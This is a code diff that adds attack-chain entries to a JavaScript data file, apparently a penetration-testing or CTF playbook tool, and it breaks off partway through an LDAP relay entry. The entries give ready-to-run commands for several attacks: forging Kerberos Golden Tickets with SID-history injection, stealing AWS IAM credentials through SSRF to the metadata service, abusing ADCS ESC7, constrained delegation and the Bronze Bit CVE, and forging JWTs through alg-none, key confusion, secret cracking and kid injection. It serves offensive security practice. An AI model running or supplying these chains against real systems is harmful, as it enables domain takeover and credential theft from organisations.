@@ -99,6 +99,109 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "ad-trust-enumeration",
+      "name": "AD — Trust enumeration + cross-domain pivot prep",
+      "description": "Once you have a domain foothold, map every trust (parent/child, external, forest). Cross-forest paths are often weakly defended and offer the only route from a child domain to the forest root.\n",
+      "tags": [
+        "recon",
+        "trusts",
+        "active-directory",
+        "cross-forest",
+        "enumeration"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "user",
+          "source": "target_context.user",
+          "required": true
+        },
+        {
+          "name": "password",
+          "source": "target_context.password",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "enum_trusts_ldap",
+          "name": "Trusts via LDAP",
+          "command_ref": "nxc-ldap-enum-trusts",
+          "inputs": {
+            "dc-ip": "${dc_ip}",
+            "user": "${user}",
+            "password": "${password}"
+          },
+          "notes": "Important columns:\n - `TrustType` (Forest, Domain, MIT) — Forest trusts cross trees.\n - `TrustDirection` (Inbound, Outbound, Bidirectional).\n - `TrustAttribute` (FOREST_TRANSITIVE, FILTER_SIDS, etc.) — `FILTER_SIDS`\n   being ABSENT (i.e. SID filtering disabled) is the green light for\n   SID-history injection.\n",
+          "capture": [
+            {
+              "var": "trust_targets",
+              "regex": "\\[\\+\\][^\\n]*Trust\\s+(?:to|with)\\s+([A-Za-z0-9.-]+)",
+              "match": "all"
+            }
+          ]
+        },
+        {
+          "id": "bloodhound_trusts",
+          "name": "Visualize trusts in BloodHound",
+          "inline_command": "echo 'In BloodHound: MATCH p=(:Domain)-[r:TrustedBy*1..3]->(:Domain) RETURN p — shows every trust edge as an interactive graph.'",
+          "notes": "The `Domain` nodes have edges of type TrustedBy / SameForestTrust.\nLook for paths from your foothold domain to others.\n"
+        },
+        {
+          "id": "dns_lookup",
+          "name": "DNS-resolve every trusted domain to find DCs",
+          "inline_command": "for d in <trust_targets>; do\n  echo \"=== $d ===\"\n  nslookup -type=SRV _ldap._tcp.dc._msdcs.$d <dc-ip>\ndone\n",
+          "inputs": {
+            "dc-ip": "${dc_ip}"
+          },
+          "notes": "The SRV record returns FQDN+port of every DC in the trusted domain.\nAdd them to /etc/hosts so Kerberos works (PKINIT needs the SPN).\n"
+        },
+        {
+          "id": "child_to_parent_sid_history",
+          "name": "Child→parent: SID history injection (if you own child DA)",
+          "inline_command": "# Get the Enterprise Admins SID via the parent's domain SID + RID 519:\n# impacket-lookupsid '<child_domain>/<user>:<password>'@<child_dc> 0\nimpacket-ticketer \\\n  -nthash '<krbtgt_nt_hash>' \\\n  -domain-sid '<child_domain_sid>' \\\n  -domain '<child_domain>' \\\n  -extra-sid '<parent_domain_sid>-519' \\\n  Administrator\n",
+          "notes": "Forges a Golden Ticket in the child with an Enterprise Admins SID in\nthe SID history → ticket is accepted by parent DCs because SID\nfiltering is off by default INSIDE a forest. From there: DCSync the\nparent.\n"
+        },
+        {
+          "id": "forest_trust_external",
+          "name": "External forest trust → look for SID filter quirks",
+          "inline_command": "# Investigate FILTER_SIDS quarantine flag — if cleared on an external trust, SID-history works cross-forest too. Rare but devastating when present."
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — Domain Trusts",
+          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/domain-trusts.html"
+        },
+        {
+          "title": "SpecterOps — Inter-forest TrustedBy",
+          "url": "https://posts.specterops.io/forest-trust-the-things-you-thought-you-knew-23afe6d40c0c"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "cross-forest paths open up",
+          "reason": "Combine with Golden Ticket + SID history for cross-domain takeover."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "reached new domain",
+          "reason": "Spread the new identity in the trusted domain."
+        }
+      ]
+    },
+    {
       "id": "alwaysinstallelevated",
       "name": "Windows PE — AlwaysInstallElevated → MSI to SYSTEM",
       "description": "When both HKLM\\\\...\\\\Installer\\\\AlwaysInstallElevated and the matching HKCU key are 1, any user can install MSI packages elevated. msfvenom builds the payload in seconds.\n",
@@ -153,6 +256,12 @@ const CHAIN_DATA = {
         {
           "title": "HackTricks — AlwaysInstallElevated",
           "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "dpapi-secrets-extraction",
+          "reason": "SYSTEM shell — loot the box."
         }
       ]
     },
@@ -245,6 +354,390 @@ const CHAIN_DATA = {
         {
           "title": "Evil-WinRM",
           "url": "https://github.com/Hackplayers/evil-winrm"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "pth-lateral-spread",
+          "when": "cracked password gives admin somewhere",
+          "reason": "Spread the freshly-cracked credential."
+        },
+        {
+          "chain": "dpapi-secrets-extraction",
+          "when": "local admin on the host",
+          "reason": "Loot every saved cred via DPAPI."
+        },
+        {
+          "chain": "windows-priv-esc-recon",
+          "when": "low-priv evil-winrm shell",
+          "reason": "If not Administrator, enumerate for privesc."
+        }
+      ]
+    },
+    {
+      "id": "aws-imds-ssrf",
+      "name": "Cloud — SSRF → AWS IMDS → IAM role credentials",
+      "description": "Server-Side Request Forgery on an EC2-hosted app gives you HTTP access from inside the VPC. Hit the Instance Metadata Service (169.254.169.254) to enumerate the instance role and steal its temporary AWS credentials. IMDSv1 = free creds. IMDSv2 = one extra step.\n",
+      "tags": [
+        "cloud",
+        "aws",
+        "ssrf",
+        "imds",
+        "post-exploitation"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "ssrf_url",
+          "description": "Vulnerable URL that fetches arbitrary URLs (e.g. http://target/preview?url=)",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "confirm_ssrf",
+          "name": "Confirm SSRF reaches internal IPs",
+          "inline_command": "curl '<url>http://169.254.169.254/'",
+          "inputs": {
+            "url": "${ssrf_url}"
+          },
+          "notes": "Should return some response (200 with the IMDS index, or 404, or\na connection-refused error if not on AWS). Anything but a generic\ntimeout is good news.\n"
+        },
+        {
+          "id": "detect_imds_version",
+          "name": "Detect IMDSv1 vs IMDSv2",
+          "inline_command": "curl '<url>http://169.254.169.254/latest/meta-data/'",
+          "inputs": {
+            "url": "${ssrf_url}"
+          },
+          "notes": "IMDSv1 returns the metadata index directly. IMDSv2 returns 401\n\"Unauthorized\" — you need a token first.\n"
+        },
+        {
+          "id": "imdsv2_token",
+          "name": "Get IMDSv2 session token (skip on v1)",
+          "inline_command": "# Need SSRF that supports PUT + custom header; many do via param tricks:\ncurl -X PUT '<url>http://169.254.169.254/latest/api/token' \\\n  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'\n",
+          "inputs": {
+            "url": "${ssrf_url}"
+          },
+          "notes": "If SSRF only supports GET → you're stuck (this is exactly why IMDSv2\nexists). Some apps proxy custom headers — check for `headers=` query\nparams or templated header forwarding.\n",
+          "capture": [
+            {
+              "var": "imds_token",
+              "regex": "([A-Za-z0-9+/=]{40,})",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "list_roles",
+          "name": "Enumerate the IAM role attached to the instance",
+          "inline_command": "# v1:\ncurl '<url>http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n# v2 (use token from previous step):\ncurl '<url>http://169.254.169.254/latest/meta-data/iam/security-credentials/' \\\n  -H 'X-aws-ec2-metadata-token: <token>'\n",
+          "inputs": {
+            "url": "${ssrf_url}"
+          },
+          "capture": [
+            {
+              "var": "aws_role_name",
+              "regex": "^([A-Za-z0-9_.-]+)$",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "steal_credentials",
+          "name": "Steal AccessKey + SecretKey + SessionToken",
+          "inline_command": "curl '<url>http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'\n",
+          "inputs": {
+            "url": "${ssrf_url}",
+            "role": "${aws_role_name}"
+          },
+          "notes": "Response JSON has AccessKeyId, SecretAccessKey, Token, Expiration.\nToken lasts ~1-6 hours — race against the clock.\n",
+          "capture": [
+            {
+              "var": "aws_access_key",
+              "regex": "\"AccessKeyId\"\\s*:\\s*\"([A-Z0-9]+)\"",
+              "match": "first"
+            },
+            {
+              "var": "aws_secret_key",
+              "regex": "\"SecretAccessKey\"\\s*:\\s*\"([A-Za-z0-9/+=]+)\"",
+              "match": "first"
+            },
+            {
+              "var": "aws_session_token",
+              "regex": "\"Token\"\\s*:\\s*\"([A-Za-z0-9/+=]+)\"",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "enumerate_aws",
+          "name": "Use the credentials with AWS CLI",
+          "inline_command": "export AWS_ACCESS_KEY_ID='<key>'\nexport AWS_SECRET_ACCESS_KEY='<secret>'\nexport AWS_SESSION_TOKEN='<token>'\naws sts get-caller-identity\naws s3 ls\naws iam list-attached-role-policies --role-name '<role>'\n",
+          "inputs": {
+            "key": "${aws_access_key}",
+            "secret": "${aws_secret_key}",
+            "token": "${aws_session_token}",
+            "role": "${aws_role_name}"
+          },
+          "notes": "With creds in hand: list S3 buckets, enumerate IAM, pacu/ScoutSuite\nthe account. The role often has more rights than just app-level\naccess (over-provisioned by default).\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "AWS IMDS docs",
+          "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html"
+        },
+        {
+          "title": "HackTricks — AWS SSRF",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "AWS shell via SSM (rare)",
+          "reason": "If you escalated via SSM, stabilize."
+        }
+      ]
+    },
+    {
+      "id": "certipy-esc7-ca-manage",
+      "name": "ADCS ESC7 — abuse Manage CA / Manage Certificates permission",
+      "description": "When a low-priv principal has `Manage CA` or `Manage Certificates` rights on the CA itself (not just on a template), they can publish a new vulnerable template OR officer-approve a previously-denied request. Either way → domain takeover.\n",
+      "tags": [
+        "adcs",
+        "esc7",
+        "priv-esc",
+        "certificates",
+        "active-directory"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "user",
+          "source": "target_context.user",
+          "required": true
+        },
+        {
+          "name": "password",
+          "source": "target_context.password",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "find_esc7",
+          "name": "Confirm Manage CA / Manage Certificates rights",
+          "command_ref": "certipy-find",
+          "inputs": {
+            "ip": "${dc_ip}",
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}"
+          },
+          "notes": "Look at the CA section: `Permissions: Manage CA, Manage Certificates`\non your principal → ESC7. Note the CA name and the username.\n",
+          "capture": [
+            {
+              "var": "ca_name",
+              "regex": "\\[Certificate Authority\\][\\s\\S]*?CA Name\\s*:\\s*(.+?)$",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "enable_template",
+          "name": "Publish (re-enable) the SubCA template via Manage CA",
+          "command_ref": "certipy-esc7",
+          "inputs": {
+            "dc-ip": "${dc_ip}",
+            "domain": "${domain}",
+            "user": "${user}",
+            "password": "${password}",
+            "ca_name": "${ca_name}"
+          },
+          "notes": "Certipy's ESC7 path adds your principal as an officer of the CA, then\nrequests a SubCA certificate (which always allows SAN). Two-step\nautomatic. Watch for `[+] Certificate written to '<user>.pfx'`.\n",
+          "capture": [
+            {
+              "var": "pfx_file",
+              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "pkinit_auth",
+          "name": "PKINIT auth → DA NT hash",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "pfx_file"
+          ],
+          "inputs": {
+            "pfx_file": "${pfx_file}",
+            "ip": "${dc_ip}"
+          },
+          "capture": [
+            {
+              "var": "dc_nt_hash",
+              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "dcsync",
+          "name": "Loot the domain",
+          "command_ref": "secretsdump",
+          "requires": [
+            "dc_nt_hash"
+          ]
+        }
+      ],
+      "references": [
+        {
+          "title": "Certified Pre-Owned — ESC7",
+          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+        },
+        {
+          "title": "Certipy ESC7",
+          "url": "https://github.com/ly4k/Certipy"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "dc_nt_hash captured",
+          "reason": "You hold the DA — Golden Ticket time."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "dc_nt_hash captured",
+          "reason": "Walk every server with the DA hash."
+        }
+      ]
+    },
+    {
+      "id": "constrained-delegation-s4u",
+      "name": "AD — Constrained delegation S4U2self + S4U2proxy abuse",
+      "description": "A computer or service account with msDS-AllowedToDelegateTo set on specific SPNs can ask the KDC for a ticket as ANY user to those SPNs (S4U2self + S4U2proxy). Often missed in BloodHound's \"shortest path\" paths.\n",
+      "tags": [
+        "delegation",
+        "constrained-delegation",
+        "s4u",
+        "kerberos",
+        "active-directory"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "delegating_principal",
+          "description": "User or computer with msDS-AllowedToDelegateTo set.",
+          "required": true
+        },
+        {
+          "name": "delegating_password",
+          "description": "Password OR NT hash of the delegating principal.",
+          "required": true
+        },
+        {
+          "name": "target_spn",
+          "description": "SPN listed in msDS-AllowedToDelegateTo (e.g. cifs/dc01.corp.local).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "enumerate_delegation",
+          "name": "Find principals with constrained delegation set",
+          "command_ref": "nxc-ldap-find-delegation",
+          "inputs": {
+            "dc-ip": "${dc_ip}"
+          },
+          "notes": "Output lists `<principal>  Constrained  <spn1>;<spn2>;...`. Record\nthe SPN list — those are the only services you can ride into via\nS4U2proxy. Look for cifs/, host/, http/ — particularly if listed\nagainst a DC, you basically own the domain.\n"
+        },
+        {
+          "id": "with_protocol_transition",
+          "name": "S4U2self + S4U2proxy (with protocol transition)",
+          "inline_command": "impacket-getST \\\n  -spn '<target_spn>' \\\n  -impersonate Administrator \\\n  -dc-ip <dc-ip> \\\n  '<domain>/<principal>:<password>'\n",
+          "inputs": {
+            "dc-ip": "${dc_ip}",
+            "domain": "${domain}",
+            "principal": "${delegating_principal}",
+            "password": "${delegating_password}",
+            "target_spn": "${target_spn}"
+          },
+          "notes": "`TRUSTED_TO_AUTH_FOR_DELEGATION` (\"with protocol transition\") allows\nthe impersonation of ANY user even without an inbound TGT. If you\nsee only `TRUSTED_FOR_DELEGATION` (no protocol transition), this\nchain won't fly — use the unconstrained-delegation-printerbug chain\ninstead.\n",
+          "capture": [
+            {
+              "var": "s4u_ccache",
+              "regex": "Saving ticket in (\\S+\\.ccache)",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "use_ticket",
+          "name": "Use the forged ticket",
+          "inline_command": "export KRB5CCNAME=<ccache>\nklist\n# If target_spn is cifs/<host>:\nimpacket-secretsdump -k -no-pass <host>\n# If host/<host>:\nimpacket-psexec -k -no-pass <host>\n",
+          "inputs": {
+            "ccache": "${s4u_ccache}"
+          },
+          "notes": "Each ticket is tied to ONE SPN. Need both cifs and host (psexec)?\nRe-run S4U2proxy for each SPN — or use krbrelayx to spray.\n"
+        },
+        {
+          "id": "alt_protocol",
+          "name": "No protocol transition? Try the Bronze Bit (CVE-2020-17049)",
+          "inline_command": "impacket-getST -spn '<target_spn>' -impersonate Administrator -dc-ip <dc-ip> -force-forwardable '<domain>/<principal>:<password>'",
+          "inputs": {
+            "dc-ip": "${dc_ip}",
+            "domain": "${domain}",
+            "principal": "${delegating_principal}",
+            "password": "${delegating_password}",
+            "target_spn": "${target_spn}"
+          },
+          "notes": "`-force-forwardable` exploits CVE-2020-17049. Patched on most modern\nDCs but lives on CTF/lab boxes for years.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "Wagging the Dog (Constrained Delegation)",
+          "url": "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
+        },
+        {
+          "title": "The Hacker Recipes — Constrained Delegation",
+          "url": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "dpapi-secrets-extraction",
+          "when": "s4u_ccache + target is a server",
+          "reason": "Loot the target with the forged ticket."
+        },
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "target_spn covered the DC",
+          "reason": "Domain-wide compromise → persistence."
         }
       ]
     },
@@ -343,6 +836,17 @@ const CHAIN_DATA = {
           "title": "bloodyAD",
           "url": "https://github.com/CravateRouge/bloodyAD"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "shadow-credentials",
+          "reason": "Silent path when you have GenericAll/Write — usually safer than a password reset."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "new credential captured",
+          "reason": "Spread the harvested identity."
+        }
       ]
     },
     {
@@ -401,6 +905,12 @@ const CHAIN_DATA = {
         {
           "title": "Container escape patterns",
           "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "reason": "Host shells almost always need a TTY upgrade."
         }
       ]
     },
@@ -493,6 +1003,18 @@ const CHAIN_DATA = {
         {
           "title": "HackTricks — DPAPI",
           "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dpapi-extracting-passwords.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "pth-lateral-spread",
+          "when": "ntlm_hashes captured",
+          "reason": "Cascading hashes → cascading lateral movement."
+        },
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "krbtgt hash captured",
+          "reason": "krbtgt → Golden Ticket persistence."
         }
       ]
     },
@@ -618,6 +1140,18 @@ const CHAIN_DATA = {
           "title": "Certipy README",
           "url": "https://github.com/ly4k/Certipy"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "dc_nt_hash captured",
+          "reason": "You hold the DA — forge golden tickets."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "dc_nt_hash captured",
+          "reason": "Use the DA NT hash to walk every server."
+        }
       ]
     },
     {
@@ -704,6 +1238,23 @@ const CHAIN_DATA = {
           "title": "PayloadsAllTheThings — Upload Insecure Files",
           "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "reverse shell received",
+          "reason": "Stabilize."
+        },
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "shell on Linux",
+          "reason": "Escalate from www-data."
+        },
+        {
+          "chain": "windows-priv-esc-recon",
+          "when": "shell on Windows IIS",
+          "reason": "IIS AppPool → SeImpersonate path."
+        }
       ]
     },
     {
@@ -784,6 +1335,113 @@ const CHAIN_DATA = {
         {
           "title": "HackTricks — GPP",
           "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "pth-lateral-spread",
+          "when": "gpp_cred captured",
+          "reason": "GPP creds usually grant local admin on many boxes."
+        },
+        {
+          "chain": "dpapi-secrets-extraction",
+          "when": "local admin via GPP",
+          "reason": "Local admin → DPAPI dump."
+        }
+      ]
+    },
+    {
+      "id": "jwt-attacks",
+      "name": "Web — JWT attacks (none / alg confusion / weak secret)",
+      "description": "JSON Web Tokens are a CTF staple for auth bypass. The four common weaknesses: `alg:none` accepted, RS→HS algorithm confusion, weak HMAC secret crackable offline, kid header path traversal.\n",
+      "tags": [
+        "web",
+        "jwt",
+        "auth-bypass",
+        "crypto"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_url",
+          "description": "An endpoint that accepts the JWT (usually in Authorization: Bearer or cookie).",
+          "required": true
+        },
+        {
+          "name": "token",
+          "description": "A valid (low-priv) JWT to mutate.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "decode",
+          "name": "Decode header + payload (no key needed)",
+          "inline_command": "echo '<token>' | cut -d. -f1 | base64 -d; echo; echo '<token>' | cut -d. -f2 | base64 -d",
+          "inputs": {
+            "token": "${token}"
+          },
+          "notes": "The header tells you `alg` (HS256 / RS256 / none / ES256...) and\noptionally `kid` (key id). The payload tells you what claim you'd\nwant to change (typically `role`, `admin`, `user_id`).\n"
+        },
+        {
+          "id": "alg_none",
+          "name": "Try alg=none",
+          "inline_command": "# Modify header to {\"alg\":\"none\",\"typ\":\"JWT\"}, payload as desired,\n# signature empty.\npython3 -c '\nimport json, base64\ndef b64(d): return base64.urlsafe_b64encode(json.dumps(d, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nh = b64({\"alg\":\"none\",\"typ\":\"JWT\"})\np = b64({\"sub\":\"admin\",\"role\":\"admin\",\"exp\":9999999999})\nprint(f\"{h}.{p}.\")'\n",
+          "notes": "Bad JWT libraries accept `none` as valid (signature ignored). Always\nworth a try — 5 second test.\n"
+        },
+        {
+          "id": "rs_to_hs_confusion",
+          "name": "RS256 → HS256 confusion (sign with the public key)",
+          "inline_command": "# Get the server's public key (often at /jwks.json, /.well-known/jwks,\n# /api/v1/auth/key, or embedded in a JS bundle).\ncurl '<url>/.well-known/jwks.json' -o jwks.json\n# Convert JWK → PEM with jwt_tool (or jwk2pem)\npython3 -m jwt_tool '<token>' -X k -pk pub.pem\n",
+          "inputs": {
+            "url": "${target_url}",
+            "token": "${token}"
+          },
+          "notes": "Bug: server's verify call uses the public key as a SYMMETRIC HMAC\nsecret because it's lazy about typing. Attacker signs with HS256\nusing the public key (which they have) and the server validates.\n"
+        },
+        {
+          "id": "weak_secret",
+          "name": "Weak HS256 secret — crack offline",
+          "inline_command": "echo '<token>' > token.txt\nhashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt\n# or john:\njohn --wordlist=/usr/share/wordlists/rockyou.txt token.txt\n",
+          "inputs": {
+            "token": "${token}"
+          },
+          "notes": "If alg is HS256/384/512, the entire token's signature is HMAC(secret,\nheader.payload). hashcat -m 16500 / john's hsec256 cracks it in\nseconds against rockyou for weak secrets (\"secret\", \"key\", \"jwt\", etc.).\n",
+          "capture": [
+            {
+              "var": "jwt_secret",
+              "regex": "^([^:]+):(\\S+)$",
+              "match": "first",
+              "groups": {
+                "hash": 1,
+                "secret": 2
+              }
+            }
+          ]
+        },
+        {
+          "id": "kid_path_traversal",
+          "name": "kid header path traversal / SQLi",
+          "inline_command": "# Some servers do: read_key(jwt.kid) without sanitization.\n# Try: kid = ../../../../dev/null, sign with empty key\n# Or: kid = ' UNION SELECT 'attacker-controlled-secret' --\n",
+          "notes": "Rare but devastating. Tools: jwt_tool's --exploit (covers everything\nabove automatically). Always run `python3 jwt_tool.py <token> -M at`\nfor full attack tree.\n"
+        },
+        {
+          "id": "forge_admin_token",
+          "name": "Forge the high-priv token (once you have a working method)",
+          "inline_command": "python3 -c '\nimport jwt\ntok = jwt.encode({\"sub\":\"admin\",\"role\":\"admin\",\"exp\":9999999999}, \"<secret>\", algorithm=\"HS256\")\nprint(tok)'\n",
+          "inputs": {
+            "secret": "${jwt_secret}"
+          }
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger — JWT attacks",
+          "url": "https://portswigger.net/web-security/jwt"
+        },
+        {
+          "title": "jwt_tool",
+          "url": "https://github.com/ticarpi/jwt_tool"
         }
       ]
     },
@@ -879,6 +1537,128 @@ const CHAIN_DATA = {
         {
           "title": "Impacket secretsdump",
           "url": "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "pth-lateral-spread",
+          "when": "cracked_service_creds captured",
+          "reason": "Service accounts often live across many hosts."
+        },
+        {
+          "chain": "mssql-impersonation-chain",
+          "when": "cracked MSSQLSvc",
+          "reason": "A SQL service account → instant MSSQL pivot."
+        }
+      ]
+    },
+    {
+      "id": "kerberos-bronze-bit",
+      "name": "AD — Bronze Bit (CVE-2020-17049) bypass forwardable check",
+      "description": "Constrained delegation without protocol transition normally refuses to emit a forwardable TGS for an unforwardable user. The Bronze Bit flips the forwardable flag at S4U2self time, letting you S4U2proxy as protected users (Domain Admins) too.\n",
+      "tags": [
+        "kerberos",
+        "bronze-bit",
+        "cve-2020-17049",
+        "delegation",
+        "priv-esc"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "domain",
+          "source": "target_context.domain",
+          "required": true
+        },
+        {
+          "name": "delegating_principal",
+          "description": "Computer/user with constrained delegation set.",
+          "required": true
+        },
+        {
+          "name": "delegating_aes_key",
+          "description": "AES256 key OR NT hash of the delegating principal.",
+          "required": true
+        },
+        {
+          "name": "target_spn",
+          "description": "SPN to ride into (e.g. cifs/dc01.corp.local).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "confirm_constrained",
+          "name": "Confirm the principal has constrained delegation",
+          "command_ref": "nxc-ldap-find-delegation",
+          "inputs": {
+            "dc-ip": "${dc_ip}"
+          },
+          "notes": "Bronze Bit requires `TRUSTED_TO_AUTH_FOR_DELEGATION` to be FALSE (no\nprotocol transition). If TRUE, just use the standard\nconstrained-delegation-s4u chain instead.\n"
+        },
+        {
+          "id": "confirm_target_protected",
+          "name": "Confirm the impersonation target is in 'Protected Users' / Sensitive",
+          "inline_command": "nxc ldap <dc-ip> -u <user> -p <password> --query \\\n  \"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))\" \\\n  \"sAMAccountName,distinguishedName\"\n",
+          "inputs": {
+            "dc-ip": "${dc_ip}"
+          },
+          "notes": "`0x100000` = ACCOUNTDISABLE? No — that flag means NOT_DELEGATED. If\nAdministrator has it, S4U normally fails. Bronze Bit bypasses that.\n"
+        },
+        {
+          "id": "detonate_bronze_bit",
+          "name": "Run S4U2self+S4U2proxy with -force-forwardable",
+          "inline_command": "impacket-getST \\\n  -spn '<target_spn>' \\\n  -impersonate Administrator \\\n  -dc-ip <dc-ip> \\\n  -force-forwardable \\\n  '<domain>/<principal>:<aes_or_nt>'\n",
+          "inputs": {
+            "dc-ip": "${dc_ip}",
+            "domain": "${domain}",
+            "principal": "${delegating_principal}",
+            "aes_or_nt": "${delegating_aes_key}",
+            "target_spn": "${target_spn}"
+          },
+          "notes": "Requires patched impacket (`getST.py` with -force-forwardable). The\nticket file ends up at `<user>@<spn>.ccache`. PATCH STATUS: KB4598347\n(Feb 2021) fixed it — only works on unpatched DCs (still very common\non HTB/labs).\n",
+          "capture": [
+            {
+              "var": "bronze_ccache",
+              "regex": "Saving ticket in (\\S+\\.ccache)",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "use_ticket",
+          "name": "Use the forged ticket",
+          "inline_command": "export KRB5CCNAME=<ccache>\nklist\nimpacket-secretsdump -k -no-pass <target_host>\n",
+          "inputs": {
+            "ccache": "${bronze_ccache}"
+          }
+        }
+      ],
+      "references": [
+        {
+          "title": "Bronze Bit (Netspi)",
+          "url": "https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/"
+        },
+        {
+          "title": "Impacket -force-forwardable",
+          "url": "https://github.com/fortra/impacket/pull/1101"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "dpapi-secrets-extraction",
+          "when": "forged admin ticket on a host",
+          "reason": "Loot DPAPI on the now-owned target."
+        },
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "target was DC",
+          "reason": "Domain compromise → Golden Ticket."
         }
       ]
     },
@@ -1000,6 +1780,151 @@ const CHAIN_DATA = {
           "title": "BloodHound queries",
           "url": "https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "asrep-to-shell",
+          "when": "asrep_hashes captured",
+          "reason": "AS-REP-roastable accounts found."
+        },
+        {
+          "chain": "kerberoast-chain",
+          "when": "tgs_hashes captured",
+          "reason": "Kerberoastable SPNs found."
+        },
+        {
+          "chain": "password-spray",
+          "when": "user_list populated",
+          "reason": "Try the obvious passwords against the user list."
+        },
+        {
+          "chain": "shadow-credentials",
+          "when": "BloodHound shows GenericWrite edge",
+          "reason": "Silent takeover path for write-access primitives."
+        }
+      ]
+    },
+    {
+      "id": "ldap-relay-shadow-cred",
+      "name": "AD — LDAPS relay + Shadow Credentials (no signing required)",
+      "description": "LDAP signing isn't enforced by default. Relay coerced auth to LDAPS, write a KeyCredentialLink to a high-value target, then PKINIT as that target. Single-shot domain takeover when ADCS is reachable.\n",
+      "tags": [
+        "ntlm-relay",
+        "ldap",
+        "shadow-credentials",
+        "adcs",
+        "priv-esc"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "dc_ip",
+          "source": "target_context.ip",
+          "required": true
+        },
+        {
+          "name": "target_principal",
+          "description": "User/computer to take over (defaults to a DC for full takeover).",
+          "required": true
+        },
+        {
+          "name": "listener_ip",
+          "description": "Your attacker IP.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "ldap_signing_check",
+          "name": "Check LDAP signing requirement",
